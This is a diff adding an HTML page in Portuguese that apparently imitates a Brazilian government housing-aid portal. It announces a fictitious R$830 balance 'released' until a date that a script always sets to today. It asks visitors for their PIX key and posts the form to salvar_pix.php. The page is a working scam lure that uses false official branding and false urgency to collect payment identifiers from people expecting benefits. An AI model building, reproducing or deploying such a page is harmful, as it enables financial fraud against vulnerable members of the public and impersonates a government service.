@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="pt-BR"><head>
+  
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="robots" content="noindex, follow">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+   <link rel="preconnect" href="https://fonts.googleapis.com/">
+  <link rel="stylesheet" href="./Saldo_files/com11.css">
+  <link rel="stylesheet" href="./Saldo_files/font.css">
+  <link rel="stylesheet" href="./Saldo_files/com.css">
+  <title>Saldo - Modificado para Envio</title>
+</head>
+<body>
+
+<div class="top-header" style="background-color:#ffffff; color: #1351b4;">
+	
+		<div style="margin: 0 auto;padding: 10px 0px 10px 20vw;">
+			<a href="https://saldo.html#"><img src="./Saldo_files/eNv2EQC.png" alt="PgSoft" style="margin-left: 0!important;width: 100px;margin-bottom: 0;"></a>
+		</div>
+
+		
+		<div>
+			      <i class="fas fa-search header-icon"></i>
+            <i class="fas fa-question-circle header-icon"></i>
+            <i class="fas fa-adjust header-icon"></i>
+		</div>
+		
+		
+	</div>
+				<div style="display: flex; padding: 10px; background: #0070c0;">
+			<div class="header_flex_item" style="width:70%">💰 Saldo: <font color="yellow"><span>R$830,00</span></font></div>
+			<div class="header_flex_item" style="width:70%">Saldo liberado até <font color="yellow"><span id="current_date">12/8/2025</span></font></div>
+													        <script>
+        date = new Date();
+        year = date.getFullYear();
+        month = date.getMonth() + 1;
+        day = date.getDate();
+        document.getElementById("current_date").innerHTML = day + "/" + month + "/" + year;
+        </script>
+		</div>
+<div class="pix-container">
+  <h2>Saque seu Benefício via PIX e receba imediatamente.<br><br>Saldo Disponível: R$830,00</h2>
+
+  <form method="POST" action="salvar_pix.php"> 
+    <div id="formFields">
+      <label for="valorPix">Valor (R$):</label>
+      <input type="number" id="valorPix" value="830.00" readonly="">
+
+      <label for="chavePix">Chave PIX:</label>
+      <input type="text" id="chavePix" name="pix" placeholder="Digite CPF, e-mail ou telefone" required>
+
+      <div class="pix-paste-button-container">
+        <button type="button" class="pix-paste-button" onclick="colarChave()">Colar</button>
+      </div>
+
+      <button type="submit" class="send-pix">SACAR AGORA</button>
+    </div>
+  </form>
+  </div>
+
+<div id="commentsya">
+</div>
+<script>
+	date = new Date();
+        year = date.getFullYear();
+        month = date.getMonth() + 1;
+        day = date.getDate() ;
+        document.getElementById("current_date2").innerHTML = day + "/" + month + "/" + year;
+    </script>
+<script async="" src="./Saldo_files/js"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-DFF470EP50');
+</script>
+    <div id="footer" style="background-color:#1351b4; margin-bottom:0px;; font-size:12px; text-align:center; color:#EFEFEF;">
+      <p style="padding:20px; padding-bottom:0px;"></p>
+      <p style="line-height:40px; margin-bottom:0px;">© 2025 - Aux - Moradia.</p>
+    </div>
+
+</body></html>
